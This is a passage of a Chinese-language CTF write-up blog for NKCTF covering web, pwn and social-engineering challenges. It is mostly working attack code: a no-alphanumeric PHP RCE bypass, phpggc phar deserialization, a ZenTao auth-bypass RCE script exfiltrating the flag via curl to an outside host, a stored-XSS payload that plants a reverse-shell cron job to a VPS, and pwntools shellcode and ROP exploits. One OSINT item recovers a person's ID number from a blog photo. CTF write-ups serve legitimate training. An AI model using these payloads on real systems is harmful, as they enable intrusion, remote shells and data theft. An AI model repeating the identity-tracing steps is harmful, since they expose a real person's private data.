class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p><p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p><p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p><p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><h2 id="easy-cms">easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p><p>左侧核心栏中有个文件式管理器，可以上传文件</p><p>存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>scandir</code>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>include</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/NKCTF/page_Image/png22.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="webpagetest">webpagetest</h2><p>webpagetest反序列化</p><blockquote><p>AVD-2022-1474319:<a href="https://xz.aliyun.com/t/11798">https://xz.aliyun.com/t/11798</a></p></blockquote><p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/NKCTF/page_Image/png23.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="easy-pms">easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p><p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p><p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/NKCTF/page_Image/png24.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="xiaopi">xiaopi</h2><p>小皮存储型XSS-&gt;rce</p><blockquote><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">https://blog.csdn.net/weixin_46944519/article/details/128954060</a></p></blockquote><p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p><p>vps上放定时任务，反弹shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure><p><code>python</code>开启一个<code>http</code>服务</p><p><code>python3 -m http.server 7777</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png25.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png26.png" srcset="/img/loading.gif" lazyload alt=""></p><p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p><p><img src="/img/blog_img/NKCTF/page_Image/png27.png" srcset="/img/loading.gif" lazyload alt=""></p><h1 id="Social-Engineering">Social Engineering</h1><h2 id="Bridge">Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png28.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p><h2 id="两个人的夜晚">两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p><p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p><h2 id="狂飙">狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png29.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p><h2 id="real-social-engineering">real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p><p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p><p><code>NKCTF&#123;6107**********4710&#125;</code></p><h2 id="Ferris-Wheel">Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p><p><img src="/img/blog_img/NKCTF/page_Image/png30.png" srcset="/img/loading.gif" lazyload alt=""></p><p>百度地图找到渝西之眼，组合爆破下地名</p><p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p><h2 id="旅程的开始">旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p><p><img src="/img/blog_img/NKCTF/page_Image/png31.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p><h2 id="The-other-Bridge">The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png32.png" srcset="/img/loading.gif" lazyload alt=""></p><p>根据提示加个<code>畔</code></p><p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p><h2 id="decompile">decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p><p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p><h1 id="pwn">pwn</h1><h2 id="ezshellcode">ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner">a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-stack">ez_stack</h2><figure class="highlight python"><table><tr><td 